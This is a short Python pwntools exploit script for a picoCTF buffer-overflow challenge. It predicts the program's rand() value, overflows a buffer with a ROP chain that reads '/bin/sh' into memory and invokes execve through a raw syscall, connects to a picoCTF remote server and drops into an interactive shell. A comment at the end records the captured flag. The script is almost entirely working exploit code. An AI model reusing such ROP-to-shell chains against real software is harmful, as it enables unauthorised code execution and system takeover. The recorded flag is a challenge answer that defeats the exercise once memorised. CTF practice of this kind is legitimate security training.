from pwn import *
from ctypes import CDLL
libc = CDLL('libc.so.6')
context.binary = "./vuln"
script = """
b*win+63
"""
#libc.srand(libc.time(None))
ans = (libc.rand() % 100)+1
xor_rax_rax_syscall = 0x000000000044a6aa
pop_rax = 0x00000000004163f4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044cc26
ret = 0x0000000000400416
syscall = 0x000000000040137c
#p = process()
p = remote("jupiter.challenges.picoctf.org",39940)
p.sendline(str(ans).encode())

payload = cyclic(120) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x6b7000)
payload += p64(pop_rdx) + p64(0x100) + p64(xor_rax_rax_syscall) + p64(ret) 
payload += p64(pop_rdi) + p64(0x6b7000) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b) + p64(syscall) 
#gdb.attach(p,script)
p.sendline(payload)
print(p.recv())
p.recv()
p.sendline(b'/bin/sh\x00')
p.interactive()
#Flag = picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_8cd37a0911d46b6b}